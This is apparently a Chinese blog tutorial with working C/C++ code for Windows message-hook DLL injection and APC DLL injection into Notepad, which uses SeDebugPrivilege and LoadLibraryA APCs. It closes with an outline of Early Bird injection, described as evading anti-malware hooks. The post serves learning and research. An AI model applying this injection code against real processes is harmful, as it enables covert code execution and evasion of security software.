<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*hookOn)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*hookOff)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>	HMODULE hmod = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;F:\\c\\hookdll\\x64\\Release\\hookdll.dll&quot;</span>);<br>	<span class="hljs-keyword">if</span> (hmod == <span class="hljs-literal">NULL</span>) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hmod LoadLibraryA Failed\n&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	hookOn hook_on = (hookOn)<span class="hljs-built_in">GetProcAddress</span>(hmod, <span class="hljs-string">&quot;Hookstart&quot;</span>);<br>	<span class="hljs-keyword">if</span> (hook_on == <span class="hljs-literal">NULL</span>) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hook_on GetProcAddress Failed\n&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br><br>	hookOff hook_off = (hookOff)<span class="hljs-built_in">GetProcAddress</span>(hmod, <span class="hljs-string">&quot;Hookstop&quot;</span>);<br>  <span class="hljs-keyword">if</span> (hook_off == <span class="hljs-literal">NULL</span>) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hook_off GetProcAddress Failed\n&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<span class="hljs-built_in">hook_on</span>();<br>	<span class="hljs-built_in">getchar</span>();<br>	<span class="hljs-built_in">hook_off</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure>





<p>不是主播不会截图，是全局钩子给我把截图也卡住了。所以只能照相，兄弟们也能看见，一堆程序全钩住了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031528552.png" srcset="/img/loading.gif" lazyload alt="image-20251003152834025"></p>
<h2 id="指定线程HOOK注入"><a href="#指定线程HOOK注入" class="headerlink" title="指定线程HOOK注入"></a>指定线程HOOK注入</h2><p>重要的点其实就是将dll文件里面的这个参数改为指定的PID</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031535367.png" srcset="/img/loading.gif" lazyload alt="image-20251003153530215"></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-function">DWORD <span class="hljs-title">GetProcessPID</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* lpProcessName)</span> </span>&#123;<br>    DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>    PROCESSENTRY32 P32; <span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>    <span class="hljs-comment">// 获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>    HANDLE hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-comment">// 使用 C++ 的 iostream 进行错误输出</span><br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取进程快照失败，请检查原因。错误码: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回0表示失败</span><br>    &#125;<br><br>    P<span class="hljs-number">32.</span>dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br><br>    <span class="hljs-comment">// 获取快照中第一个进程信息</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Process32First</span>(hSnapshot, &amp;P32)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取第一个进程信息失败。错误码: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">// 比较进程名。lstrcmp 是 Windows API 函数，用于比较字符串。</span><br>        <span class="hljs-comment">// 在 C++ 中，也可以使用 std::strcmp 或 C 风格字符串的比较。</span><br>        <span class="hljs-comment">// 这里为了保持与原代码的逻辑一致性，继续使用 lstrcmp。</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">lstrcmp</span>(P<span class="hljs-number">32.</span>szExeFile, lpProcessName)) &#123;<br>            ret = P<span class="hljs-number">32.</span>th32ProcessID; <span class="hljs-comment">// 匹配成功，记录PID</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(hSnapshot, &amp;P32)); <span class="hljs-comment">// 检索有关系统快照中记录的下一个进程的信息。</span><br><br>    <br>    <span class="hljs-built_in">CloseHandle</span>(hSnapshot); <span class="hljs-comment">// 关闭句柄</span><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-function">DWORD <span class="hljs-title">GetFirstProcessThreadTID</span><span class="hljs-params">(DWORD processId)</span> </span>&#123;<br>    DWORD firstTID = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的第一个线程TID，初始为0（未找到）</span><br><br>    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;<br>    THREADENTRY32 te32; <span class="hljs-comment">// 结构体，用于存储线程快照信息</span><br><br>    <span class="hljs-comment">// 获取所有线程的快照</span><br>    hThreadSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取线程快照失败，请检查原因。错误码: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回0表示失败</span><br>    &#125;<br><br>    <span class="hljs-comment">// 在使用 THREADENTRY32 结构体之前，必须设置其 dwSize 成员</span><br>    te<span class="hljs-number">32.</span>dwSize = <span class="hljs-built_in">sizeof</span>(THREADENTRY32);<br><br>    <span class="hljs-comment">// 检索系统中第一个线程的信息</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Thread32First</span>(hThreadSnap, &amp;te32)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取第一个线程信息失败。错误码: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hThreadSnap);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回0表示失败</span><br>    &#125;<br><br>    <span class="hljs-comment">// 遍历所有线程，查找属于指定进程的线程</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (te<span class="hljs-number">32.</span>th32OwnerProcessID == processId) &#123;<br>            firstTID = te<span class="hljs-number">32.</span>th32ThreadID; <span class="hljs-comment">// 匹配成功，记录TID</span><br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 找到第一个就退出循环</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Thread32Next</span>(hThreadSnap, &amp;te32)); <span class="hljs-comment">// 检索有关系统快照中记录的下一个线程的信息。</span><br><br>    <span class="hljs-built_in">CloseHandle</span>(hThreadSnap); <span class="hljs-comment">// 关闭句柄</span><br>    <span class="hljs-keyword">return</span> firstTID;<br>&#125;<br><br><br><br><br>HHOOK hHook=<span class="hljs-literal">NULL</span>;<br>HINSTANCE hInst = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">HookProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hHook, nCode, wParam, lParam);<span class="hljs-comment">//给下一个钩子或者应用程序继续处理消息</span><br><br><br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Hookstart</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> pid = <span class="hljs-built_in">GetProcessPID</span>(<span class="hljs-string">&quot;Notepad.exe&quot;</span>);<br>   <span class="hljs-type">int</span> tid= <span class="hljs-built_in">GetFirstProcessThreadTID</span>(pid);<br>   <span class="hljs-keyword">if</span> (tid == <span class="hljs-number">0</span>) &#123;<br>       <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;没有找到线程&quot;</span>, <span class="hljs-string">&quot;错误&quot;</span>, MB_OK);<br>       <span class="hljs-keyword">return</span>;<br>   &#125;<br>    hHook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, HookProc, hInst, tid);<br><br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Hookstop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 卸载钩子</span><br>    <span class="hljs-keyword">if</span> (hHook) &#123;<br>        <span class="hljs-built_in">UnhookWindowsHookEx</span>(hHook);<br>    &#125;<br>    <br>&#125;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        hInst=hModule;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;yawataa&quot;</span>, <span class="hljs-string">&quot;yawataa&quot;</span>, MB_OK);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>测试的时候将notepad.exe开启，当点击添加新页面或者是关掉notepad时就会弹窗</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031618172.png" srcset="/img/loading.gif" lazyload alt="image-20251003161838095"></p>
<h1 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h1><h2 id="APC的介绍"><a href="#APC的介绍" class="headerlink" title="APC的介绍"></a>APC的介绍</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>APC的中文名为为异步过程调用，APC是一个链状的数据结构，可以让一个线程在其本应该执行步骤前执行其他代码。每个线程都维护一个APC链。当线程从等待状态苏醒后，会自动检测自己的APC队列中是否存在APC过程，所以只需要将目标进程的线程的APC队列里面添加APC过程，当然为了提高注入成功率可以向所有线程里面添加APC过程，然后促使线程从休眠中恢复就可以实现注入。</p>
<p>(让线程进入可警告状态的函数 SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx、 </p>
<p>WaitForMultipleObjectsEx或WaitForSingleObjectEx函数)</p>
<h2 id="APC注入的一些前置知识"><a href="#APC注入的一些前置知识" class="headerlink" title="APC注入的一些前置知识"></a>APC注入的一些前置知识</h2><p>1.线程会在进程内执行</p>
<p>2.线程会调用APC队列中的函数</p>
<p>3.应用可以给特定的线程的APC队列中压入函数(有权限控制)</p>
<p>4.压入队列后，线程将按照顺序优先级执行</p>
<p>5.这种技术的缺点是只有当线程处于alertable状态时才会去执行这些APC函数</p>
<h2 id="APC的本质"><a href="#APC的本质" class="headerlink" title="APC的本质"></a>APC的本质</h2><p>线程是不能被杀掉、挂起、恢复的，线程在执行的时候自己占据着CPU，别人怎么可能控制它呢？ </p>
<p>举个极端的例子：如果不调用API，屏蔽中断，并保证代码不出现异常，线程将永久占用CPU。所以说线 </p>
<p>程如果想死，一定是自己执行代码把自己杀死，不存在他杀这种情况。那如果想改变一个线程的行为该 </p>
<p>怎么办呢？可以给他提供一个函数，让它自己去调用，这个函数就是APC(Asyncroneus Procedure </p>
<p>Call)，即异步过程调用</p>
<p>相当于就是，在线程在占用的时候，我们可以往他的APC队列中插入一个删除的函数，然后使用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsExWaitForMultipleObjectsEx或WaitForSingleObjectEx函数 这些函数 让其进入可警告状态，恢复线程的时候就会执行APC队列中的删除函数</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>思路</p>
<ol>
<li><p>OpenProcess 打开进程 </p>
</li>
<li><p>VirtualAlloc 申请空间 </p>
</li>
<li><p>WriteProcessMemory 写入dll信息</p>
</li>
</ol>
<p>4.根据进程对应的线程id打开线程 </p>
<p>5.使用 QueueUserApc 插入执行</p>
<p>代码</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>DWORD GetProcessPID(<span class="hljs-type">char</span>* lpProcessName) &#123;<br><br>	DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>	PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>	<span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>	HANDLE IpSnashot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>		printf(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>, GetLastError());<br>	&#125;<br>	P32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br>	Process32First(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-keyword">if</span> (!lstrcmp(P32.szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>			ret = P32.th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>	&#125; <span class="hljs-keyword">while</span> (Process32Next(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>	CloseHandle(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-comment">//提权函数(注入到线程需要权限)</span><br><span class="hljs-type">BOOL</span> EnableDebugPrivilege() &#123;<br>	HANDLE hToken;<br>	<span class="hljs-type">BOOL</span> fok;<br>	<span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;<br>		TOKEN_PRIVILEGES tp;<br>		tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>		LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>		tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>		AdjustTokenPrivileges(hToken, <span class="hljs-literal">FALSE</span>, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>		fok = (GetLastError() == ERROR_SUCCESS);<br>		CloseHandle(hToken);<br><br><br><br><br>	&#125;<br>	<span class="hljs-keyword">return</span> fok;<br><br><br><br>&#125;<br><span class="hljs-type">BOOL</span> ApcInjectDll(DWORD dwPid, <span class="hljs-type">char</span>* pszDllName) &#123;<br><br>	EnableDebugPrivilege();<br>	<span class="hljs-comment">//1.打开进程获取进程句柄</span><br>	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, dwPid);<br>	<span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>		printf(<span class="hljs-string">&quot;openProcess erro! ;&quot;</span>, GetLastError());<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><br><br>	&#125;<br>	<span class="hljs-comment">//2.申请内存空间</span><br>	<span class="hljs-type">int</span> nsize = strlen(pszDllName);<br>	LPVOID PDDLaddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, nsize, MEM_COMMIT, PAGE_READWRITE);<br><br>	<span class="hljs-comment">//3. WriteProcessMemory 写入dll信息 </span><br>	SIZE_T wWrittenSize = <span class="hljs-number">0</span>;<br>	WriteProcessMemory(hProcess, PDDLaddr, pszDllName, nsize, &amp;wWrittenSize);<br>	<span class="hljs-comment">//4.获取到Loadlibary地址，等会加载dll</span><br>	HMODULE hmod = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>	FARPROC pFuncAddr = GetProcAddress(hmod, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>	<span class="hljs-comment">//5.给进程的每一个线程都注入APC序列确保能执行成功</span><br>	THREADENTRY32 te = &#123; <span class="hljs-number">0</span> &#125;;<br>	te.dwSize = <span class="hljs-keyword">sizeof</span>(te);<br><br>	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>	&#125;<br>	DWORD dwRet = <span class="hljs-number">0</span>;<br>	HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">if</span> (Thread32First(hSnap, &amp;te)) &#123;<br>		<span class="hljs-keyword">do</span> &#123;<br>			<span class="hljs-keyword">if</span> (te.th32OwnerProcessID == dwPid) &#123;<br>				hThread = OpenThread(THREAD_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, te.th32ThreadID);<br>				<span class="hljs-keyword">if</span> (hThread) &#123;<br>					<span class="hljs-comment">//往APC队列中插入Load；ibary函数 参数为PDDLadd</span><br>					dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)PDDLaddr);<br>					hThread = <span class="hljs-literal">NULL</span>;<br>				&#125;<br>			&#125;<br>		&#125; <span class="hljs-keyword">while</span> (Thread32Next(hSnap, &amp;te));<br>	&#125;<br><br>	CloseHandle(hThread);<br>	CloseHandle(hProcess);<br>	CloseHandle(hSnap);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br><br>&#125;<br><span class="hljs-type">int</span> main()<br>&#123;<br>	<span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br>	pid = GetProcessPID(<span class="hljs-string">&quot;Notepad.exe&quot;</span>);<br>	<span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>		printf(<span class="hljs-string">&quot;未找到进程&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-type">char</span>* dll_path = <span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\\Release\\yawatadll.dll&quot;</span>;<br>	<br>	<br>	<span class="hljs-keyword">if</span> (ApcInjectDll(pid, dll_path)) &#123;<br>		printf(<span class="hljs-string">&quot;注入成功&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br>	<br>&#125;<br><br><br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031635112.png" srcset="/img/loading.gif" lazyload alt="image-20251003163526790"></p>
<h2 id="Early-Bird-APC注入的衍生"><a href="#Early-Bird-APC注入的衍生" class="headerlink" title="(Early Bird)APC注入的衍生"></a>(Early Bird)APC注入的衍生</h2><p>Early Bird是一种简单而强大的技术，Early Bird本质上是一种APC注入与线程劫持的变体，由于线程初始化时会调用ntdll未导出函数NtTestAlert，该函数会清空并处理APC队列，所以注入的代码通常在进程的主线程的入口点之前运行并接管进程控制权，从而避免了反恶意软件产品的钩子的检测，同时获得一个合法进程的环境信息。</p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-285748.htm">原创]APC与Early Bird注入-编程技术-看雪论坛-安全社区|非营利性质技术交流社区</a></p>
<h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><ol>
<li>创建一个挂起的进程(通常是windows的合法进程)</li>
<li>在挂起的进程内申请一块可读可写可执行的内存空间</li>
<li>往申请的空间内写入shellcode</li>
<li>将APC插入到该进程的主线程</li>
<li>恢复挂起进程的线程</li>
</ol>
